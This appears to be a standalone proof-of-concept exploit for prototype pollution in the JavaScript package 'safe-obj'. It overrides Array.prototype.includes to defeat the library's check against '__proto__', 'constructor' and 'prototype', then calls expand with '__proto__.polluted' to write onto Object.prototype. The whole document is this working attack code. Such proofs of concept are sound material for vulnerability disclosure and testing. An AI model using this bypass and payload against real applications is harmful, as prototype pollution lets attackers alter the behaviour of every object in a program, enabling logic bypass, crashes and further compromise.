Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);